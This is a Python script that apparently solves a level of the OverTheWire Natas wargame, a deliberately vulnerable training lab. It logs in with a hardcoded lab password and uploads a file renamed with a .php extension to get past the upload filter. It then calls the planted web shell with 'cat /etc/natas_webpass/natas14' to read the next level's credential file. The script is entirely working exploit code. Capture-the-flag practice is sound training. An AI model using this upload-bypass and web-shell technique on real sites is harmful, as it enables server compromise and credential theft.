import requests
import bs4 
username = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"

url = "http://%s.natas.labs.overthewire.org" % username
s = requests.Session()

file = {"uploadedfile": open('natas13.jpg', 'rb')}
data = {"MAX_FILE_SIZE": 1000, "filename": "natas13.php"}

r = s.post(url, auth = (username,password), files=file, data=data)

soup = bs4.BeautifulSoup(r.text, 'lxml')
upload_link = soup.find('a')
webshell_url = url + "/"+ upload_link['href']
webshell_response = s.get(webshell_url+"?c=cat /etc/natas_webpass/natas14", auth = (username,password))
print(webshell_response.text.strip()[-32:])